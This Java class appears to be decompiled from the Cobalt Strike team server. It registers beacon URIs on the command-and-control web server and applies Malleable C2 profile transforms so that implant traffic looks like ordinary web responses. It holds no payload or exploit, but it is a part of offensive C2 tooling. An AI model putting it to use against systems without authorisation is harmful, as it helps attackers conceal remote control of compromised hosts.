package c2profile;

import cloudstrike.Response;
import cloudstrike.WebServer;
import cloudstrike.WebService;

import java.io.InputStream;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;

public class MalleableHook implements WebService {
    protected MyHook hook = null;

    protected Profile profile;

    protected String desc = "";

    protected String type = "";

    protected String key = "";

    public MalleableHook(Profile profile, String string1, String string2) {
        this.profile = profile;
        this.type = string1;
        this.desc = string2;
    }

    public void setup(WebServer webServer, String string, MyHook paramMyHook) {
        this.hook = paramMyHook;
        this.key = string;
        webServer.register("beacon" + string, this);
        String[] arrstring = this.profile.getString(string + ".uri").split(" ");
        for (byte b = 0; b < arrstring.length; b++) {
            webServer.registerSecondary(arrstring[b], this);
            webServer.setSpecialPostURI(arrstring[b]);
        }
    }

    public void setup(WebServer webServer, String string) {
        throw new RuntimeException("Missing arguments");
    }

    public Response serve(String string1, String string2, Properties properties1, Properties properties2) {
        try {
            Response response = new Response("200 OK", null, (InputStream) null);
            byte[] arrby = this.hook.serve(string1, string2, properties1, properties2);
            this.profile.apply(this.key + ".server", response, arrby);
            return response;
        } catch (Exception exception) {
            exception.printStackTrace();
            return new Response("500 Internal Server Error", "text/plain", "Oops... something went wrong");
        }
    }

    public String toString() {
        return this.desc;
    }

    public String getType() {
        return this.type;
    }

    public List cleanupJobs() {
        return new LinkedList();
    }

    public boolean suppressEvent(String string) {
        return true;
    }

    public boolean isFuzzy() {
        return true;
    }

    public static interface MyHook {
        byte[] serve(String string1, String string2, Properties properties, Properties properties2);
    }
}
